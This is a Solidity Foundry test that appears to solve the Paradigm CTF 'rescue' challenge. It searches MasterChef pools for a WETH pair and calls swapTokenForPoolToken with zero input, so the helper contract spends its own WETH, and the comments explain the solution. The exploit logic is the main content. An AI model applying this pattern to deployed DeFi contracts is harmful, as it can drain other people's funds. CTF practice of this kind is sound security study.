// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/rescue/public/contracts/Setup.sol";
import "../src/rescue/public/contracts/MasterChefHelper.sol";
import "../src/rescue/public/contracts/UniswapV2Like.sol";


contract ContractTest is Test {
    function setUp() public {

    }

    function testExploit() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        Setup setup = Setup(0x8D11c5b86e0DBeEa31B1AD41632232021e71c198);
        address weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        MasterChefHelper c = MasterChefHelper(setup.mcHelper());

        // Solution:
        //   win condition: weth.balanceOf(MasterChefHelper) == 0
        //   MasterChefHelper._addLiquidity will convert the contract's LP underlying into an LP
        //   therefore, we just need to call swapTokenForPoolToken() such that it converts existing WETH into an LP
        //   so realistically we just need to find a pool that uses WETH as one of its tokens

        // crawl the pools looking for a pair that is mapped to WETH
        uint256 SEARCH_LIMIT = 10;  // how many masterchef.poolInfos we should check. arbitrary value
        uint256 poolId;
        address lpToken;
        address tokenOut0;
        address tokenOut1;
        for (uint256 i = 0; i < SEARCH_LIMIT; i++) {
            (lpToken,,,) = c.masterchef().poolInfo(i);
            tokenOut0 = UniswapV2PairLike(lpToken).token0();
            tokenOut1 = UniswapV2PairLike(lpToken).token1();
            if (tokenOut0 == weth || tokenOut1 == weth) {
                poolId = i;
                break;
            }
        }

        address tokenIn = weth;  // any valid ERC20 could be used here, we know for a fact WETH is one of them
        uint256 amountIn = 0;  // we got no tokens ourselves!
        uint256 minAmountOut = 0;  // avoids revert
        ERC20Like(weth).approve(address(c), type(uint256).max);
        c.swapTokenForPoolToken(poolId, tokenIn, amountIn, minAmountOut);

        // sneaky win condition: MasterChefHelper does not hold WETH :)
        assertEq(ERC20Like(weth).balanceOf(address(c)), 0);
    }
}
